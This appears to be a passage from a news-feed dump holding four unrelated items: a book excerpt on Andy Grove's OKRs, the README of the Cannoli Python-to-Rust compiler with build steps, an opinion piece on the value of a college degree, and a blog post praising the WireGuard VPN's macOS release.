&lt;p&gt;&lt;strong&gt;Excerpt from&lt;/strong&gt; &lt;strong&gt;&lt;em&gt;Measure What Matters&lt;/em&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;By John Doerr&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Intel was Grove’s laboratory for management innovation. He loved to teach, and the company reaped the benefits. A few days after getting hired, I received a coveted invitation to Intel’s Organization, Philosophy, and Economics course, known as iOPEC, a seminar on Intel strategy and operations. Resident professor: Dr. Andy Grove.&lt;/p&gt;
&lt;p&gt;In the space of an hour, Grove traced the company’s history, year by year. He summarized Intel’s core pursuits: a profit margin twice the industry norm, market leadership in any product line it entered, the creation of “challenging jobs” and “growth opportunities” for employees. Fair enough, I thought, though I’d heard similar things at business school.&lt;/p&gt;
&lt;p&gt;Then he said something that left a lasting impression on me.&lt;span&gt; &lt;/span&gt;He referenced his previous company, Fairchild, where he’d first met Robert Noyce and Gordon Moore and went on to blaze a trail in silicon wafer research. Fairchild was the industry’s gold standard, but it had one great flaw: a lack of “achievement orientation.”&lt;/p&gt;
&lt;p&gt;“Expertise was very much valued there,” Andy explained. “That is why people got hired. That’s why people got promoted. Their effectiveness at translating that knowledge into actual results was kind of shrugged off.” At Intel, he went on, “we tend to be exactly the opposite. It almost doesn’t matter what you know. It’s what you can do with whatever you know or can acquire and actually accomplish [that] tends to be valued here.” Hence the company’s slogan: “Intel delivers.”&lt;/p&gt;
&lt;p&gt;&lt;em&gt;It almost doesn’t matter what you know&lt;/em&gt;… To claim that knowledge was secondary and execution all-important—well, I wouldn’t learn &lt;em&gt;that&lt;/em&gt; at Harvard. I found the proposition thrilling, a real-world affirmation of accomplishment over credentials. But Grove wasn’t finished, and he had saved the best for last. Over a few closing minutes, he outlined a system he’d begun to install in 1971, when Intel was three years old.&lt;span&gt; &lt;/span&gt;It was my first exposure to the art of formal goal setting. I was mesmerized.&lt;/p&gt;
&lt;p&gt;A few unvarnished excerpts, straight from the father of OKRs:&lt;/p&gt;
&lt;p&gt;Now, the two key phrases…are objectives and the key result. And they match the two purposes. The objective is the direction: “We want to dominate the mid-range microcomputer component business.” That’s an objective. That’s where we’re going to go. Key results for this quarter: “Win ten new designs for the 8085” is one key result. It’s a milestone. The two are not the same…&lt;/p&gt;

&lt;p&gt;The key result has to be measurable. But at the end you can look, and without any arguments: Did I do that or did I not do it? Yes? No? Simple. No judgments in it.&lt;/p&gt;

&lt;p&gt;Now, did we dominate the mid-range microcomputer business? That’s for us to argue in the years to come, but over the next quarter we’ll know whether we’ve won ten new designs or not.&lt;/p&gt;
&lt;p&gt;It was a “very, very simple system,” Grove said, knowing simplicity was catnip to an audience of engineers. On its face, the conception seemed logical, commonsensical—and inspiring. Against the stale management orthodoxy of the period, Grove had created something fresh and original. Strictly speaking, however, his “objectives and key results” did not spring from the void. The process had a precursor. In finding his way, Grove had followed the trail of a legendary, Vienna-born gadfly, the first great “modern” business management thinker: Peter Drucker.&lt;/p&gt;

&lt;p&gt;Cannoli is a compiler for a subset of Python 3.6.5 and is designed to evaluate the language features of Python that negatively impact performance. Cannoli is written in &lt;a href=&quot;https://www.rust-lang.org/&quot; rel=&quot;nofollow&quot;&gt;Rust&lt;/a&gt; and also compiles Python to Rust. The use of Rust as the intermediate representation was chosen for performance purposes and to avoid writing a garbage collector. Cannoli was developed as work for a Master's Thesis as &lt;a href=&quot;https://www.calpoly.edu/&quot; rel=&quot;nofollow&quot;&gt;Cal Poly - San Luis Obispo&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Python Support&lt;/h3&gt;
&lt;p&gt;Cannoli supports a subset of Python 3.6.5, it's current state omits many features that could not be completed during the duration of the thesis. The main omissions are exceptions and inheritance. Standard library support is also incomplete but covers numerous proofs-of-concepts that could be applied to other types and modules (see &lt;a href=&quot;https://github.com/joncatanio/cannoli#cannolib&quot;&gt;Cannolib&lt;/a&gt;).&lt;/p&gt;
&lt;h3&gt;Optimizations&lt;/h3&gt;
&lt;p&gt;Cannoli supports two major optimizations that come as a result of applying restrictions to the language. Restrictions are placed on the Python features that provide the ability to delete or inject scope elements and the ability to mutate the structure of objects and classes at run time. The corresponding feature branches are &lt;a href=&quot;https://github.com/joncatanio/cannoli/tree/scope-opts&quot;&gt;&lt;code&gt;scope-opts&lt;/code&gt;&lt;/a&gt; and &lt;a href=&quot;https://github.com/joncatanio/cannoli/tree/class-opts&quot;&gt;&lt;code&gt;class-opts&lt;/code&gt;&lt;/a&gt;. The optimizations are built on top of each other, therefore the &lt;code&gt;class-opts&lt;/code&gt; branch is a superset of the &lt;code&gt;scope-opts&lt;/code&gt; branch. In general, the &lt;code&gt;class-opts&lt;/code&gt; branch yields a performance increase of over 50% from the &lt;code&gt;master&lt;/code&gt; branch.&lt;/p&gt;
&lt;h3&gt;Thesis Paper&lt;/h3&gt;
&lt;p&gt;More information on the results and implementation details of Cannoli can be found in the thesis paper.&lt;/p&gt;
&lt;p&gt;👉 &lt;em&gt;&lt;a href=&quot;https://github.com/joncatanio/cannoli/blob/master/resources/papers/cannoli-thesis-paper.pdf&quot;&gt;Leave the Features: Take the Cannoli&lt;/a&gt;&lt;/em&gt; - Jonathan Catanio&lt;/p&gt;
&lt;h3&gt;How to Run&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;Install Rust by following the instructions on their official &lt;a href=&quot;https://www.rust-lang.org/en-US/install.html&quot; rel=&quot;nofollow&quot;&gt;installation guide&lt;/a&gt;. Cannoli is both compiled with Rust 1.24.0 and outputs Rust 1.24.0 code. Changing versions with the Rust toolchain can be done with the &lt;code&gt;rustup&lt;/code&gt; utility.&lt;/li&gt;
&lt;li&gt;Build the project by running &lt;code&gt;cargo build&lt;/code&gt; or &lt;code&gt;cargo build --release&lt;/code&gt; in the project's root directory. This will create a &lt;code&gt;target&lt;/code&gt; directory with &lt;code&gt;debug&lt;/code&gt; or &lt;code&gt;release&lt;/code&gt; subdirectories containing the executable.&lt;/li&gt;
&lt;li&gt;Compile a Python file by executing the command &lt;code&gt;./target/release/cannoli [src.py]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;Executing the Compiled Python&lt;/h3&gt;
&lt;p&gt;Compiling with Cannoli outputs a &lt;code&gt;main.rs&lt;/code&gt; file that can be used in a standalone Rust crate. Ideally the Cannoli compiler would utilize &lt;code&gt;rustc&lt;/code&gt; to output a binary but this wasn't done. The steps on how to run this compiled file are as follows:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Create a new crate with the command &lt;code&gt;cargo new --bin sandbox&lt;/code&gt;. Where &lt;code&gt;sandbox&lt;/code&gt; is the name of the crate.&lt;/li&gt;
&lt;li&gt;Move the &lt;code&gt;main.rs&lt;/code&gt; file into the new crate's &lt;code&gt;src&lt;/code&gt; directory.&lt;/li&gt;
&lt;li&gt;Update the &lt;code&gt;Cargo.toml&lt;/code&gt; file to include &lt;code&gt;cannolib&lt;/code&gt; as a dependency, this is Cannoli's standard library. This can be done by linking to a git repository or to a relative crate.&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;[dependencies]
cannolib = { git = 'https://github.com/joncatanio/cannolib', branch = 'master' }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Would include the master branch of the Cannolib git repo in the crate.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;To add debugging and all optimizations to release mode, also include these lines in the &lt;code&gt;Cargo.toml&lt;/code&gt;:&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;[profile.release]
debug = true
codegen-units = 1
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;Finally, build the project from the crate's root directory with &lt;code&gt;cargo build --release&lt;/code&gt; and run the executable with the command &lt;code&gt;./target/release/sandbox&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;Cannolib&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/joncatanio/cannolib&quot;&gt;Cannolib&lt;/a&gt; provides library support for Cannoli, including a number of types and modules that offload work that would have otherwise been done by the Cannoli compiler. Cannolib provides the implementation of the overall type system as well as built-in functions similar to those defined in the &lt;a href=&quot;https://docs.python.org/3/library/functions.html#built-in-functions&quot; rel=&quot;nofollow&quot;&gt;Python library&lt;/a&gt;.&lt;/p&gt;

<title>College May Not Be Worth It Anymore</title>
<link>https://www.nytimes.com/2018/05/16/opinion/college-useful-cost-jobs.html</link>
<guid isPermaLink="true" >https://www.nytimes.com/2018/05/16/opinion/college-useful-cost-jobs.html</guid>
<description>&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;It’s a cruel irony that a college degree is worth less to people who most need a boost: those born poor. This revelation was made by the economists Tim Bartik and Brad Hershbein. Using a body of data, the Panel Study of Income Dynamics, which includes 50 years of interviews with 18,000 Americans, they were able to follow the lives of children born into poor, middle-class and wealthy families.&lt;/p&gt;
&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;&lt;a class=&quot;css-1g7m0tk&quot; href=&quot;http://research.upjohn.org/cgi/viewcontent.cgi?article=1302&amp;amp;context=up_workingpapers&quot; title=&quot;&quot; target=&quot;_blank&quot;&gt;They found&lt;/a&gt; that for Americans born into middle-class families, a college degree does appear to be a wise investment. Those in this group who received one earned 162 percent more over their careers than those who didn’t.&lt;/p&gt;
&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;But for those born into poverty, the results were far less impressive. College graduates born poor earned on average only slightly more than did high school graduates born middle class. And over time, even this small “degree bonus” ebbed away, at least for men: By middle age, male college graduates raised in poverty were earning less than nondegree holders born into the middle class. The scholars conclude, “Individuals from poorer backgrounds may be encountering a glass ceiling that even a bachelor’s degree does not break.”&lt;/p&gt;
&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;The authors don’t speculate as to why this is the case, but it seems that students from poor backgrounds have less access to very high-income jobs in technology, finance and other fields. Class and race surely play a role.&lt;/p&gt;
&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;We appear to be approaching a time when, even for middle-class students, the economic benefit of a college degree will begin to dim. Since 2000, the growth in the wage gap between high school and college graduates has &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;http://libertystreeteconomics.newyorkfed.org/2014/09/college-may-not-pay-off-for-everyone.html&quot; title=&quot;&quot; target=&quot;_blank&quot;&gt;slowed to a halt&lt;/a&gt;; 25 percent of college graduates now earn no more than does the average high school graduate.&lt;/p&gt;
&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;Part of the reason is oversupply. Technology increased the demand for educated workers, but that demand has been consistently outpaced by the number of people — urged on by everyone from teachers to presidents — prepared to meet it.&lt;/p&gt;
&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;No other nation punishes the “uneducated” as harshly as the United States. Nearly 30 percent of Americans without a high school diploma live in poverty, compared to 5 percent with a college degree, and we infer that this comes from a lack of education. But in 28 other wealthy developed countries, a lack of a high school diploma increases the probability of poverty by less than 5 percent. In these nations, a dearth of education does not predestine citizens for poverty.&lt;/p&gt;
&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;It shouldn’t here, either: According to the Bureau of Labor Statistics, fewer than 20 percent of American jobs actually require a bachelor’s degree. By 2026, the bureau estimates that this proportion will rise, but only to 25 percent.&lt;/p&gt;

<title>MacOS command line version of the WireGuard VPN is now available for testing</title>
<link>http://latacora.singles/2018/05/16/there-will-be.html</link>
<guid isPermaLink="true" >http://latacora.singles/2018/05/16/there-will-be.html</guid>
<description>&lt;p&gt;Amidst the hubbub of the Efail PGP/SMIME debacle yesterday, the WireGuard project made a pretty momentous announcement: a MacOS command line version of the &lt;a href=&quot;https://www.wireguard.com/&quot;&gt;WireGuard VPN&lt;/a&gt; is &lt;a href=&quot;https://lists.zx2c4.com/pipermail/wireguard/2018-May/002854.html&quot;&gt;now available for testing&lt;/a&gt;, and should stabilize in the coming few months. I’m prepared to be wrong, but I think that for a lot of young tech companies, this might be the biggest thing to happen to remote access in decades.&lt;/p&gt;
&lt;p&gt;WireGuard is a modern, streamlined VPN protocol that Jason Donenfeld developed based on Trevor Perrin’s &lt;a href=&quot;http://noiseprotocol.org/&quot;&gt;Noise protocol framework&lt;/a&gt;. Imagine a VPN with the cryptographic sophistication of Signal Protocol and you’re not far off. Here are the important details:&lt;/p&gt;
&lt;p&gt;WireGuard is orders of magnitude smaller than the IPSEC or OpenVPN stacks. On Linux, the codebase is something like 4500 lines. It’s designed to be simple and easy to audit. Simplicity and concision are goals of the whole system, from protocol to implementation. The protocol was carefully designed to make it straightforward to implement without dynamic memory allocation, eliminating whole classes of memory lifecycle vulnerabilities. The crypto underpinning WireGuard is non-negotiably DJB’s ChaPoly stack, eliminating handshake and negotiation vulnerabilities.&lt;/p&gt;
&lt;p&gt;WireGuard is fast; faster than strongSwan or OpenVPN.&lt;/p&gt;
&lt;p&gt;WireGuard is extremely simple to configure. In fact, it may be pretty close to the platonic ideal of configurability: you number both end of the VPN, generate keypairs, and point the client at the server, and you’re done.&lt;/p&gt;
&lt;p&gt;Linux people have had WireGuard for many months now (WireGuard is so good that team members here at Latacora used to run Linux VMs to get it). But the most important use case for VPNs for startups is to get developers access to cloud deployment environments, and developers use MacOS, which made it hard to recommend.&lt;/p&gt;
&lt;p&gt;Not for much longer.&lt;/p&gt;
&lt;p&gt;It’s a little hard to overstate how big a deal this is. strongSwan and OpenVPN are two of the scariest bits of infrastructure startups operate for themselves. Nobody trusts either codebase, or, for that matter, either crypto protocol. Both are nightmares to configure and manage. As a result, fewer people set up VPNs than should; a basic building block of secure access management is hidden away.&lt;/p&gt;
&lt;p&gt;We’re enthusiastic about WireGuard and think startups should look into adopting it as soon as is practicable. It’s simple enough to set up that you can just run it alongside your existing VPN infrastructure until you’re comfortable with it.&lt;/p&gt;
&lt;p&gt;Death to SSH over the public Internet. Death to OpenVPN. Death to IPSEC. Long live WireGuard!&lt;/p&gt;
